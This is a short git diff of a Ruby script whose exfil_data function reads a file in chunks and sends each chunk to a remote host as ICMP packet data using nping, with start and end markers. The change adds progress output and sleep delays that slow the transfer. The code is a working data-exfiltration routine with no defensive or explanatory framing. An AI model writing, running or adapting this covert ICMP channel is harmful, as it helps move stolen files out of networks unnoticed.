@@ -15,12 +15,16 @@ end
 
 def exfil_data(host,fname)
   chunks = chunked_data(fname)
-  puts "Exfiltrating #{fname} to #{host} in #{chunks.size} chunks."
+  puts "[*] Exfiltrating #{fname} to #{host} in #{chunks.size} chunks."
   sleep 2
   puts %x{nping #{host} --icmp -c1 --data-string "BOFexfil-data.bin"}
-  chunked_data(fname).each do |chunk|
-    puts %x{nping #{host} --icmp -c1 -data #{chunk}}
+  chunked_data(fname).each_with_index do |chunk,i|
+    puts "[*] Sent chunk (#{i+1}/#{chunks.size})"
+    %x{nping #{host} --icmp -c1 -data #{chunk}}
+    sleep 5
   end
+  sleep 2
+  puts "[*] Ending file..."
   puts %x{nping #{host} --icmp -c1 --data-string "EOF"}
 end
 
